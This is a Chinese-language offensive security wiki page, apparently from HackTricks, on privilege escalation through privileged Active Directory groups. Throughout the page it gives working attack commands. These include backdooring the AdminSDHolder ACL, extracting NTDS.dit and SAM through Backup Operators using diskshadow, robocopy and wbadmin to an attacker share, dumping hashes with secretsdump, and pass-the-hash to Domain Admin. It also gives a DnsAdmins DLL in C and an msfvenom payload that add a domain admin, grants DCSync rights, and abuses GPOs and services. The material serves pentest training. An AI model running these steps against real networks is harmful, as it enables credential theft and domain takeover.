# 特权组

{{#include ../../banners/hacktricks-training.md}}

## 已知具有管理权限的组

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

该组有权限在域中创建非管理员账户和组。此外，它还允许在域控制器 (DC) 上进行本地登录。

要识别该组的成员，执行以下命令：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
允许添加新用户，也允许本地登录到 DC。

## AdminSDHolder 组

**AdminSDHolder** 组的访问控制列表 (ACL) 非常关键，因为它为 Active Directory 中所有“受保护的组”设置权限，包括高特权组。该机制通过防止未经授权的修改来确保这些组的安全。

攻击者可通过修改 **AdminSDHolder** 组的 ACL，将完全权限授予普通用户。这样该用户就能实际控制所有受保护的组。如果该用户的权限被更改或移除，系统设计会在大约一小时内自动恢复这些权限。

近期的 Windows Server 文档仍将若干内置操作员组视为 **受保护的** 对象（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins` 等）。**SDProp** 进程默认在 **PDC Emulator** 上每 60 分钟运行一次，会标记 `adminCount=1` 并在受保护对象上禁用继承。这既利于持久性，也便于搜寻那些已从受保护组中被移除但仍保留非继承 ACL 的陈旧特权用户。

用于查看成员和修改权限的命令包括：
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
有一个脚本可用于加速恢复过程： [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

欲了解更多详情，请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD 回收站

该组的成员资格允许读取已删除的 Active Directory 对象，这可能暴露敏感信息：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
这对于 **恢复先前的特权路径** 很有用。已删除的对象仍可能暴露 `lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、旧的 SPNs，或被删除的特权组的 DN，而该特权组之后可能会被其他操作者恢复。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### 域控制器访问

对 DC 上的文件的访问受限，除非用户属于 `Server Operators` 组，这会改变访问级别。

### 权限提升

使用来自 Sysinternals 的 `PsService` 或 `sc`，可以检查并修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，这允许执行任意命令并进行权限提升：
```cmd
C:\> .\PsService.exe security AppReadiness
```
该命令显示 `Server Operators` 拥有完全访问权限，能够通过操纵服务来提升权限。

## Backup Operators

加入 `Backup Operators` 组可以因为 `SeBackup` 和 `SeRestore` 权限而访问 `DC01` 文件系统。使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志，这些权限允许进行文件夹遍历、列出和复制文件的操作，即使没有显式权限也能实现。此过程需要使用特定脚本。

要列出组成员，请执行：
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 本地攻击

为在本地利用这些特权，执行以下步骤：

1. 导入必要的库：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. 启用并验证 `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 从受限目录访问并复制文件，例如：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 攻击

直接访问域控制器的文件系统可以窃取 `NTDS.dit` 数据库，该数据库包含域用户和计算机的所有 NTLM 哈希。

#### 使用 diskshadow.exe

1. 创建 `C` 驱动器的 shadow copy:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 从影子副本复制 `NTDS.dit`:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
或者，使用 `robocopy` 进行文件复制：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 提取 `SYSTEM` 和 `SAM` 以检索 hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. 从 `NTDS.dit` 中检索所有 hashes：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 提取后：Pass-the-Hash 到 DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### 使用 wbadmin.exe

1. 在攻击者机器上为 SMB 服务器设置 NTFS 文件系统，并在目标机器上缓存 SMB 凭据。
2. 使用 `wbadmin.exe` 进行系统备份并提取 `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

属于 **DnsAdmins** 组的成员可以利用其权限在 DNS 服务器上以 SYSTEM 权限加载任意 DLL，该服务器通常托管在域控制器上。这一能力带来显著的利用潜力。

要列出 DnsAdmins 组的成员，请使用：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> 这个漏洞允许在 DNS 服务中以 SYSTEM 权限执行任意代码（通常发生在 DCs 内部）。此问题已在 2021 年修复。

Members 可以使 DNS 服务器加载任意 DLL（本地或从远程共享），使用如下命令：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
必须重启 DNS 服务（可能需要额外权限），才能加载 DLL：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

也可以使用 mimilib.dll 进行命令执行，可修改它以执行特定命令或反向 shell。欲了解更多信息，请参阅 [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)。

### WPAD Record for MitM

DnsAdmins 可以修改 DNS 记录，通过在禁用 global query block list 后创建 WPAD 记录来执行 Man-in-the-Middle (MitM) 攻击。可以使用像 Responder 或 Inveigh 这样的工具进行欺骗和捕获网络流量。

### Event Log Readers
Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows 权限

该组可以修改域对象上的 DACLs，可能授予 DCSync 权限。利用该组进行权限提升的技术详见 Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
如果你能够以该组成员的身份行事，经典的滥用方式是授予由攻击者控制的主体执行 [DCSync](dcsync.md) 所需的复制权限：
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
历史上，**PrivExchange** 将 mailbox access、coerced Exchange authentication 和 LDAP relay 串联起来，以达到相同的原语。即便该 relay 路径被缓解，直接成为 `Exchange Windows Permissions` 成员或控制 Exchange server 仍然是获取 domain replication rights 的高价值途径。

## Hyper-V 管理员

Hyper-V 管理员对 Hyper-V 拥有完全访问权限，可被滥用以控制虚拟化的 Domain Controllers。这包括克隆运行中的 DC 并从 `NTDS.dit` 文件中提取 NTLM 哈希。

### 利用示例

实际滥用通常是针对 **离线访问 DC 磁盘/检查点**，而不是旧的主机级 LPE 技巧。获得对 Hyper-V 主机的访问后，操作者可以创建检查点或导出虚拟化的 Domain Controller，挂载 VHDX，并提取 `NTDS.dit`、`SYSTEM` 和其他秘密，而无需触及来宾内的 LSASS：
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
从那里，重用 `Backup Operators` 的工作流程来离线复制 `Windows\NTDS\ntds.dit` 和注册表 hives。

## 组策略创建者所有者

该组允许成员在域中创建组策略。然而，其成员不能将组策略应用于用户或组，也不能编辑现有的 GPO。

重要的细微差别是**创建者会成为新 GPO 的所有者**，并且通常随后会获得足够的权限来编辑它。这意味着当你可以做到以下任一情况时，该组就很有利用价值：

- 创建一个恶意 GPO 并说服管理员将其链接到目标 OU/域
- 编辑你创建且已链接到有用位置的 GPO
- 滥用其他被委派的、允许你链接 GPO 的权限，而该组则为你提供编辑权限

实际滥用通常意味着通过基于 SYSVOL 的策略文件添加**即时任务**、**启动脚本**、**本地管理员成员资格**或**用户权限分配**更改。
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

在部署了 **Microsoft Exchange** 的环境中，一个名为 **Organization Management** 的特殊组拥有重要权限。该组有权访问所有域用户的邮箱，并对 “Microsoft Exchange Security Groups” 组织单位（OU）拥有完全控制权。这种控制包括 `Exchange Windows Permissions` 组，该组可被用于提权。

### Privilege Exploitation and Commands

#### Print Operators

属于 **Print Operators** 组的成员拥有若干特权，包括 `SeLoadDriverPrivilege`，该权限允许他们在域控制器上本地登录、关闭它并管理打印机。要利用这些特权，特别是在非提升上下文中看不到 `SeLoadDriverPrivilege` 时，需要绕过 User Account Control (UAC)。

要列出此组的成员，使用以下 PowerShell 命令：
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
在域控制器上，这个组很危险，因为默认的 Domain Controller Policy 将 **`SeLoadDriverPrivilege`** 授予 `Print Operators`。如果你获得该组某成员的提升 token，你可以启用该权限并加载已签名但存在漏洞的驱动程序，从而跳转到 kernel/SYSTEM。有关 token 处理的详细信息，请参阅 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)。

#### Remote Desktop Users

该组的成员被授予通过 Remote Desktop Protocol (RDP) 访问 PCs 的权限。要枚举这些成员，可使用 PowerShell 命令：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
有关利用 RDP 的更多见解可在专门的 pentesting 资源中找到。

#### 远程管理用户

成员可以通过 **Windows Remote Management (WinRM)** 访问 PC。可以通过以下方式枚举这些成员：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
有关与 **WinRM** 相关的利用技术，应查阅专门的文档。

#### Server Operators

该组具有在 Domain Controllers 上执行各种配置的权限，包括备份和还原权限、更改系统时间以及关闭系统。要枚举成员，请使用下面提供的命令：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
在域控制器上，`Server Operators` 通常继承足够的权限来 **reconfigure or start/stop services** 并且通过默认 DC 策略接收 `SeBackupPrivilege`/`SeRestorePrivilege`。在实践中，这使它们成为 **service-control abuse** 和 **NTDS extraction** 之间的桥梁：
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
如果服务的 ACL 授予该组更改/启动权限，将服务指向任意命令，以 `LocalSystem` 身份启动它，然后恢复原始的 `binPath`。如果服务控制被锁定，则回退到上文的 `Backup Operators` 技巧以复制 `NTDS.dit`。

## 参考资料 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
